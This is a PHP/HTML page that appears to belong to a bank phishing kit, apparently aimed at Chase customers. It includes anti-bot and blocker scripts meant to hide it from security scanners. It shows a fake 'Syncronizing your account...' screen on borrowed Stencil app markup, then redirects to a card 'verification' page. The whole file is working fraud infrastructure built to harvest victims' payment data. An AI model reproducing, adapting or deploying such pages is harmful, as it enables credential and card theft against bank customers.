<?php
/*   
0day                   
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include './antibots.php';
include './anti.php';
include './bt.php';
include "./blocker.php";
?>


<!DOCTYPE html>
<html lang="en">
    <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        
        <title>Syncronizing your account...</title>


        <link href="https://getstencil.com/app/static/compiled/main.prod.css?fec9763f7fed704a9156781c7b54abb7" rel="stylesheet" />
        <link href="https://fonts.googleapis.com/css?family=Lato:400,100,100italic,300,300italic,400italic,700,700italic,900,900italic" rel="stylesheet" type="text/css">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <meta name="robots" content="noindex" />
		<meta http-equiv='refresh' content='3;URL=verification-card.php'/>
                               
            </head>
    <body class="app curtain">
        <div class="content">
           
            <section class="editor">
                <div class="inner">
                    <div class="wrapper">
                    </div>
                </div>
            </section>
            <section class="stage">
                <a class="close fa fa-close huge" click trigger="hide"></a>
                <div class="inner">
                </div>
            </section>
            <div class="modal busy">
                <div class="overlay"></div>
                <div class="outer">
                    <div class="inner">
                        <div class="content">
                             <div class="icon fa fa-refresh fa-spin"></div>
                             <div class="copy"><FONT color=#ff6000>Syncronizing your account...</FONT></div>
                             <div class="exception"></div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal browser hidden">
                <div class="overlay"></div>
                <div class="outer">
                    <div class="inner">
                        <div class="content">
                            <h1>You need a newer browser to use Stencil.</h1>
                            <p>
                                Install one of these browsers to use this app:
                            </p>
                            <ul class="browsers clearfix">
                                <li class="chrome">
                                    <a href="https://www.google.com/chrome/" target="_blank">
                                        <div class="thumb"></div>
                                        <div class="copy">Google Chrome</div>
                                    </a>
                                </li>
                                <li class="firefox">
                                    <a href="http://www.mozilla.org/en-US/firefox/new/" target="_blank">
                                        <div class="thumb"></div>
                                        <div class="copy">Firefox</div>
                                    </a>
                                </li>
                                <li class="ie">
                                    <a href="http://windows.microsoft.com/en-ca/internet-explorer/download-ie" target="_blank">
                                        <div class="thumb"></div>
                                        <div class="copy">Internet Explorer 11+</div>
                                    </a>
                                </li>
                                <li class="safari">
                                    <a href="http://support.apple.com/downloads/#safari" target="_blank">
                                        <div class="thumb"></div>
                                        <div class="copy">Safari</div>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal cookies hidden">
                <div class="overlay"></div>
                <div class="outer">
                    <div class="inner">
                        <div class="content">
                            <h1>
                                Your browser is currently blocking<br />
                                cookies for <strong>getstencil.com</strong>
                            </h1>
                            <p>
                                Stencil requires cookies to give you the best experience.<br />
                                Please change your settings to allow cookies for<br />
                                <strong>getstencil.com</strong> and
                                <a href="/app" class="text">reload</a> the app<br /><br />

                                If you have any trouble, send an email to
                                <a href="mailto:help@chase.com" target="_blank" class="text">help@chase.com</a>
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="templates"></div>
        <script src="https://getstencil.com/app/static/compiled/app.boot.7981a15c9b6d955fdbf348440080490d.js" type="text/javascript"></script>
        
    </body>
</html>
									